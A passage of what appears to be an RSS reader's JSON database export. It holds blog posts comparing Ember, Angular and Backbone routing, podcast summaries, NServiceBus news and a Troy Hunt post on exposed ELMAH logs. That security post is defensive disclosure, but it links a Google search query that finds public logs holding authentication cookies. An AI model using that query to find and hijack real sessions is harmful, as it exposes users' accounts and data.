class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//declare the app and any dependencies</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"App\"</span><span class=\"p\">,[]);</span></span><span class='line'></span><span class='line'><span class=\"c1\">//configure the app, injecting the Route Provider</span></span><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">config</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$routeProvider</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$routeProvider</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/about\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"about.html\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.AboutCtrl\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.FavoritesCtrl\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"favorites.html\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Angular's approach is interesting and somewhat\"concept-y\" if you're not familiar with Dependency Injection. Once you get past that (or maybe you love it already) it becomes straightforward to understand that\"here's a route, use this template and this controller\". This is straight up configuration:<strong>which is exactly what the method name is</strong>.</p><p>I love parity between method names and the code I'm writing.</p><p>Here's how you do it in Backbone:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"o\">=</span><span class=\"nx\">Backbone</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">routes</span><span class=\"o\">:</span><span class=\"p\">{</span></span><span class='line'><span class=\"s2\">\"/about\"</span><span class=\"o\">:</span><span class=\"s2\">\"showAbout\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"s2\">\"/favorites\"</span><span class=\"o\">:</span><span class=\"s2\">\"showFavorites\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">showAbout</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//render the view, or call to a controller</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">showFavorites</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"c1\">//render the view, or call to a controller</span></span><span class='line'><span class=\"p\">},</span></span></code></pre></td></tr></table></div></figure><p>The Router in Backbone is also a bit confusing - there's no doubt about it. It can quickly turn into a mess of configuration AND instrumentation - in other words doing a controller's job.</p><p>I think this is why the Ember team tried to separate the configuration of the routes from the route itself. But in doing so they marginalized the controller (which was their intent, if you read the controller's definition).</p><p>With Backbone I know what I'm getting into. I can use the Router as a controller (it used to be called that btw) and when things get a bit nuts, I can create a controller of my very own (<a href=\"http://marionettejs.com\">or just use MarionetteJS that has this concept built in</a>).</p><h2>Naming</h2><p>Ember relies heavily on naming conventions that must not only follow<a href=\"http://www.emberist.com/2012/04/09/naming-conventions.html\">syntax guidelines, but also casing guidelines</a>.</p><p>The reason for this is straightforward: Ember will generate code for you if you just need basic, boilerplated stuff, alleviating you from tedious coding which is rampant in other frameworks like Backbone.</p><p>The problem I have with this is that the relationship between things is in name only, and that seems like it's a rather brittle rule. It also tells me that I have to know the naming conventions<strong>as well as</strong>how to use the framework - which is fine, typically, as long as there's a big payoff.</p><p>And that's where I get stuck (again):<strong>what's the payoff, aside from implicit code generation, for following the naming conventions here?</strong>. Consider the routing code, above:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"about\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/about\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/favs\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>The only way I know that one thing depends on the other is by name. Now I know that should seem obvious and you might be thinking\"well duh, Rob, that's the point!\". Yes, but it's also a great way to have a highly confusing API.</p><p>What's the problem with something like this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">url</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"about\"</span><span class=\"p\">,</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/about\"</span><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This, to me, is a whole lot more apparent and I'm not reconciling functionality through a naming filter. For some that might be much easier than reading the code (or reading the tests) - to me it seems arbitrary and confusing.</p><h2>You Asked, I Answered</h2><p>In wrapping this up, I would like to say that I am writing this as a way to make my points a bit clearer to Trek as Twitter doesn't work well for this kind of thing. He didn't understand my confusion about Ember (specifically why I didn't think it aligned with my understanding of MVC) so I told him I'd write something that explained my confusion.</p><p>It would be easy to see this as\"Rob ranting on Ember\" and I'm sure it will be taken that way by many. Not my intent, really. I have 4 videos to edit in front of me, and a book to write. I took time out of my day to respectfully respond to the Ember team with my thoughts - even if they're not glowing and exciting with praise.</p><p>If Ember works for you I think that's great. It doesn't work for me.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=fCXbpkBXK6M:hHMSfTcE-sk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=fCXbpkBXK6M:hHMSfTcE-sk:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/fCXbpkBXK6M\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1133}}
{"k":"0000000084","o":"0000000729","v":"001"}
{"_id":1134,"_uid":1134,"_dt":1373742620939,"_s":"17971ed5b1bb17c066196e54bd2b00b0"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/gtkfenSh5sU/default.aspx","title":"VsVim: Visual Studio and Vim with Jared Parsons","published":{"$wrap":"$date","v":1364529600000,"h":"2013-03-29T04:00:00.000Z"},"starred":false,"read":false,"content":"An unholy alliance or a wonderful combination? Jared Parsons has created what he thinks may be the best of both worlds. VsVim combines the speed and familiarity of Vim with the power and development power of Visual Studio. How did he do it, and why?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/gtkfenSh5sU\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1134}}
{"k":"0000000084","o":"0000000642","v":"001"}
{"_id":1135,"_uid":1135,"_dt":1373742620939,"_s":"58d8966d5dd1ca4e55ebb07dd0bfc51b"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/pPpEerSHMKQ/default.aspx","title":"Firefox OS and the open Mobile Web with Christian Heilmann","published":{"$wrap":"$date","v":1366344000000,"h":"2013-04-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott's at the first AngleBrackets conference and sits down to talk about the new Firefox OS and the open Mobile Web with Mozilla's Christian Heilmann.<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/pPpEerSHMKQ\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1135}}
{"k":"0000000084","o":"0000006823","v":"001"}
{"_id":1136,"_uid":1136,"_dt":1373742620939,"_s":"a5df9f64c74ae26c5bc7c34fce0e9d1f"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/yy_zah6tFWw/convention-over-incantation","title":"Convention Over Incantation?","published":{"$wrap":"$date","v":1363618800000,"h":"2013-03-18T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>Convention over Configuration is now simply an assumed thing for modern frameworks - and this is (mostly) a good thing. Sometimes I wonder if it's being taken too far.</p><p><img src='http://wekeroad.com/images/incantations.jpg'/></p><p><h2>Conventions? Curations? Innovations?</h2><p>Convention over Configuration is a\"pull\" - meaning that it's derived from practice. Conventions evolve and ultimately people agree on them… thus the term\"convention\".</p><p>Rails made use of this most profoundly when it was introduced. From<a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles Bowkett</a>:</p><blockquote><p>When Rails first arrived, in many instances, it took the greatest ideas and most common use cases of Web development, streamlined them, simplified their developer interface, and repackaged them within cleaner APIs.</p></blockquote><p>Rails also decided to innovate at the same time, and mixed together its conventions with its innovations. The results have been mixed (in my experience):</p><ul><li>The Asset Pipeline was an interesting solution to a problem that I'm not sure many people had. I spent more time trying to get the thing to work as expected - and then finally tossed it.</li><li>I used CoffeeScript for a bit, but don't care much for it. This decreases the interest in the Asset Pipeline.</li><li>I like RSpec. I like Factories vs. Fixtures.<a href=\"http://www.youtube.com/watch?v=obOd7WrrTWQ\">I tend to completely replace the entire testing experience Rails</a>.</li></ul><p>These aren't complaints, really. Every framework you use needs to be modified to a degree to fit how you work - but I do agree with Giles' assertion:</p><blockquote><p>it is literally impossible to impose a convention on a community. It is a contradiction in terms, Orwellian doublespeak, and the human-language equivalent of a syntax error.</p></blockquote><p>For all of the syntax niggling, Rails still lets me do what I want/need to do so I'm a happy camper. I also think the\"conventions\" it once imposed are being tweaked by innovation and becoming something else.</p><p><a href=\"http://gilesbowkett.blogspot.com/2013/02/the-lie-of-convention-over-configuration.html\">Giles calls it\"Curation over Configuration\"</a>and I think I agree with him.</p><h2>Put Your Left Foot Here, Touch Your Nose, And…</h2><p>It seems that most frameworks (of any kind) are beginning to follow Rails' example by introducing some level of Convention over Configuration. This is a great timesaver,<strong>unless there are no conventions to adopt</strong>.</p><p>Which is something I've encountered with EmberJS. No, I'm not going to rant on Ember - I'm still pursuing Trek's prediction:</p><p><blockquote class=\"twitter-tweet\"><p>@<a href=\"https://twitter.com/locks\">locks</a>next post will be about @<a href=\"https://twitter.com/robconery\">robconery</a>'s Road to Damascus Moment. ;)</p>— Trek Glowacki (@trek)<a href=\"https://twitter.com/trek/status/310882156425650177\">March 10, 2013</a></blockquote><script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script></p><p>I haven't given up on Ember - even though I said as much in my last post. Well it's partly<strong>because of my last post</strong>that I can't give up - it wouldn't be fair of me would it :).</p><p>As I dive into Ember more, however,<a href=\"http://emberjs.com/guides/concepts/naming-conventions/\">I've begun musing on\"conventions\" in general</a>:</p><blockquote><p>Ember.js uses naming conventions to wire up your objects without a lot of boilerplate. You will want to use the conventional names for your routes, controllers and templates.</p></blockquote><p>By\"convention\" the team means\"prescription\". This is important because<strong>there is no convention</strong>when it comes to Single Page Applications in the traditional sense of the word\"convention\".<strong>Their naming guidelines are prescriptive</strong>- and something more.</p><p>A lot of frameworks do this kind of thing: Rails, Django, ASP.NET MVC (and I'm sure many others) expect certain files (views, for instance) to be in a particular place (which you can usually override). I like this - it promotes consistency.</p><p>Ember takes this to a different level, however. If you name things a certain way<a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/getting-into-ember-js/\">you can benefit from background code generation</a>:</p><blockquote><p>One of the ways that Ember.js helps to minimize the amount of code needed and handle things for you behind the scenes is through naming conventions. The way that you define and name your routes (and resources) impacts the naming of your controllers, models, views and templates</p></blockquote><p><strong>At what point do we call these\"Incantations\" instead of\"Conventions\"</strong>?</p><h2>The Light Isn't Blinding Me Yet</h2><p>Again - not here to pick on Ember. Strong naming has been around for a while (though I'm not sure I've seen it trigger code generation) and, far from condemning Ember - I applaud the team for taking a bold step.</p><p>I'll admit that it's not immediately sitting right with me, but I'm going to give it time to see how hard it will be for the incantations to work their way into daily memory. I'll<a href=\"http://en.wikipedia.org/wiki/Conversion_of_Paul_the_Apostle\">keep travelling the road</a>... until I'm blinded by the light or... get delirious from the heat.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=yy_zah6tFWw:Ej_rT7Ik9B0:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=yy_zah6tFWw:Ej_rT7Ik9B0:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/yy_zah6tFWw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1136}}
{"k":"0000000084","o":"0000000731","v":"001"}
{"_id":1137,"_uid":1137,"_dt":1373742620940,"_s":"fa63f60f1eafbd8e8367db814cb8c760"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/83nqnTCcX9s/default.aspx","title":"Language Hunters with Willem Larsen","published":{"$wrap":"$date","v":1362715200000,"h":"2013-03-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott sits down at Agile Open Northwest with Willem Larsen of Language Hunters. Language Hunting is an accelerated learning system designed to develop fluent speakers of all ages in a fun and supportive game-like environment. Does it work? Will it work for Scott?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/83nqnTCcX9s\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1137}}
{"k":"0000000084","o":"0000005533","v":"001"}
{"_id":1138,"_uid":1138,"_dt":1373742620940,"_s":"806dacb5985aafbb6c03a18f1a914b58"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/1gV-R5Qrv3k/security-is-hard-insecurity-is-easy.html","title":"Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk","published":{"$wrap":"$date","v":1369693560001,"h":"2013-05-27T22:26:00.001Z"},"starred":false,"read":false,"content":"<p>One could argue that security is hard. Not all aspects of it, mind you, but the prevalence of website hacks would seem to indicate that plenty of people are struggling to get it right.</p><p>On the other hand,<em>insecurity</em>can be very easy. What I mean by this is that sometimes it can be the smallest change to a website that blows the security wide open.</p><p>Last week someone passed me a private note about Black and Decker, or more to the point, they passed me a link to an unsecured ELMAH log. For the uninitiated, ELMAH logs and their discovery via Google is something<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">I’ve written about before</a>. In fact in this very case it was someone simply searching for some info on ELMAH that lead to this discovery – it’s that easy.</p><p>Now I want to stress that<strong><em>this is not intended to be all about Black and Decker</em></strong>and before posting this I did privately contact them and they have now correctly secured the logs. In fact<strong><em>there are tens of thousands of<a href=\"https://www.google.com/search?q=inurl%3Aelmah.axd+ASPXAUTH\">Google results for publicly exposed ELMAH logs</a></em></strong>so clearly this is a very prevalent risk. Let me first share the video on what you can do with exposed ELMAH logs then I’ll come back around to the point of this post:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/6ipVqkUm6Gw?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>That should put things into context regarding the risk of exposed ELMAH logs and it goes<em>well</em>beyond just session hijacking. For example the risk includes access to:</p><ol><li>Customer email addresses as they’re stored in the cookie</li><li>IP address of users (including of individual customers per the previous point)</li><li>Passwords (these are also sometimes stored in cookies)</li><li>Referrers (discloses entry points into the site)</li><li>Any other data on the site that is accessible if the session can be hijacked</li></ol><p>Keep in mind that there are tens of thousands of log entries in this particular site so there’s quite a profile an attacker could have built up.</p><p>Here’s the point I want to make:<strong><em>a frankly massive security hole like exposed ELMAH logs can occur as a result of the smallest configuration change</em></strong>and it begs the following questions:</p><p><strong>Is there any continuous security scanning of the site?</strong>This was a very basic error and in fact my own very basic<a href=\"https://asafaweb.com/\">ASafaWeb</a>scanner could have caught this on a daily scheduled scan and reported it within 24 hours of the risk occurring. Other commercial products could have identified a far broader range of risks but the point is that security scanning needs to be<em>continuous</em>, not just a one off, not on an annual basis, not just on major changes but<em>all the time</em>.</p><p><strong>Who can release changes?</strong>You’ve gotta wonder if a case like this was just a junior dev not realising what they were doing. Mind you, I’ve seen plenty of experienced devs make similar mistakes but it begs the question: just how easy is it to slip something through into a production? Is anyone actually overseeing the process? Or does one person have a few beers on a Friday afternoon and push the “publish” button?</p><p><strong>What’s the post-release review process?</strong>It’s<em>extremely</em>easy for configuration related vulnerabilities to slip through during the release process. For example a developer just wants to quickly check the details of an obscure error in a production environment so they release with verbose errors (i.e. turn off custom errors in ASP.NET) and promise themselves they’ll lock it down later. The release process should ideally catch this and set off all sorts of alarms.</p><p><strong>Are you contactable for when things go wrong?</strong>I hadn’t planned on including this section originally but given the way things played out (more on that another time), it does illustrate an important point. It was<em>extremely</em>difficult to get in touch with anyone from Black and Decker using social media and published email addresses and I eventually got through to them in a very round-a-bout fashion. It’s very hard for people to do the right thing and disclose privately when they can’t get in touch with you!</p><p>Black and Decker presented a good opportunity to illustrate the risk because of their sheer scale. This is a multinational organisation pulling in $6B a year and employing 27,000 people and something so simple slipped past them, is it any wonder that so many companies with such fewer resources struggle? And I’ll stress again – there is (unfortunately) nothing very unique about them having a risk of this nature – it’s alarmingly common as it’s so simple to do. Insecurity is indeed, easy.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/1gV-R5Qrv3k\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1138}}
{"k":"0000000084","o":"0000002595","v":"001"}
{"_id":1139,"_uid":1139,"_dt":1373742620940,"_s":"d9ad498b1d89d85108ed6f508cf06b14"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/qX5ZBZDcdNE/","title":"High Availability a la Dennis","published":{"$wrap":"$date","v":1346683888000,"h":"2012-09-03T14:51:28.000Z"},"starred":false,"read":false,"content":"<p>I thought I’d give a bit of a shout-out to Dennis van der Stelt whose been applying many of the principles from my course on his project and now has something of a success story to share. Although all he put out was a little tweet about it, I think if more people bug him, we can tease some more out:</p><blockquote class=\"twitter-tweet\"><p>First big update released of our system based on <a href=\"https://twitter.com/udidahan\"><s>@</s><b>udidahan</b></a> ADSD training, makes a maintainable system & site updates in &lt;1sec instead of 24h</p><p>— Dennis van der Stelt (@dvdstelt) <a href=\"https://twitter.com/dvdstelt/status/241869330575421442\" data-datetime=\"2012-09-01T12:05:16+00:00\">September 1, 2012</a></p></blockquote><p><script src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script></p><p>It’s not just about getting the system built quickly the first time, and it’s not just about having a maintainable code base longer term, equally important is the ability to quickly deploy major releases to the system without downtime – ‘cuz when you’re system is down, it’s not providing any business value (which is what being Agile is all about).</p><p>What do you say, Dennis? Tell us some more!</p><h3>UPDATE</h3><p>Dennis gives the full story <a href=\"http://bloggingabout.net/blogs/dennis/archive/2012/09/19/high-availability.aspx\">here</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=qX5ZBZDcdNE:cfr71RnEg_s:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=qX5ZBZDcdNE:cfr71RnEg_s:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=qX5ZBZDcdNE:cfr71RnEg_s:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=qX5ZBZDcdNE:cfr71RnEg_s:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=qX5ZBZDcdNE:cfr71RnEg_s:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/qX5ZBZDcdNE\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1139}}
{"k":"0000000084","o":"0000000830","v":"001"}
{"_id":1140,"_uid":1140,"_dt":1373742620940,"_s":"706fd9b63c8959ec5637c1d83a650870"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/wbK6lY6Yz-o/default.aspx","title":"HTML5, JavaScript, Chrome and the Web Platform with Paul Irish","published":{"$wrap":"$date","v":1363924800000,"h":"2013-03-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott sits down with Chrome Developer Advocate Paul Irish to talk HTML5, JavaScript, Chrome and the Web. What Chrome Developer Tools features make web dev easier? While Webkit marches on, should we embrace or fear monoculture? Will modules make JavaScript apps easier to write? Where does Windows fit into the world of web development?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/wbK6lY6Yz-o\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1140}}
{"k":"0000000084","o":"0000007761","v":"001"}
{"_id":1141,"_uid":1141,"_dt":1373742620940,"_s":"a4738aea5c0499cc71337a47c6fe2b1e"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/4YK220HTDWc/","title":"NServiceBus 4.0 Released!","published":{"$wrap":"$date","v":1373539501000,"h":"2013-07-11T10:45:01.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/champaign.png\" alt=\"champaign\" title=\"champaign\" width=\"180\" height=\"270\" style=\"float:right; margin-left:10px; margin-bottom:10px;\" />It’s here!</p><p>NServiceBus version 4.0 is now out.</p><p>Hard to believe it’s been more than 7 years since I started on this journey.</p><p>I know I always say this, but this is our biggest release ever. It’s been over a year since we released version 3.0 and in that time, the adoption of NServiceBus has totally exploded. I know I always talk about the big brand names but there have been hundreds of small to medium companies that have been seeing real success on this platform.</p><p>OK – one big name. I feel like I have to. If you’ve been to McDonald’s and purchased a happy meal for your kids – that’s going through NServiceBus. Yeah, at any McDonald’s around the world – and not just happy meals.</p><h3>What’s in the box</h3><p>While NServiceBus has historically used MSMQ as its primary queuing infrastructure, we now support RabbitMQ and ActiveMQ out of the box so you have full AMQP compliance at the wire level, and we’re soon going to be releasing a fully supported IBM MQ transport.</p><p>You can see the complete release notes for version 4 of NServiceBus <a href=\"http://particular.net/blog/nservicebus-v4.0-release-notes\">here</a>.</p><p>For those organization who’ve been ignoring NServiceBus until now because they prefer having everything in a central database, we now support using database tables as queues. </p><p>While I’ve always been big on queuing infrastructure, I understand that it takes time for an organization to change and I hope that this will provide a smooth transition path.</p><h3>Try it online now</h3><p>If you’re in a locked-down corporate environment that won’t let you install anything on your box, but you’d still like to try NServiceBus out, we’ve got the solution for you.</p><p>Try our new hands-on labs – you’ll get remote access to 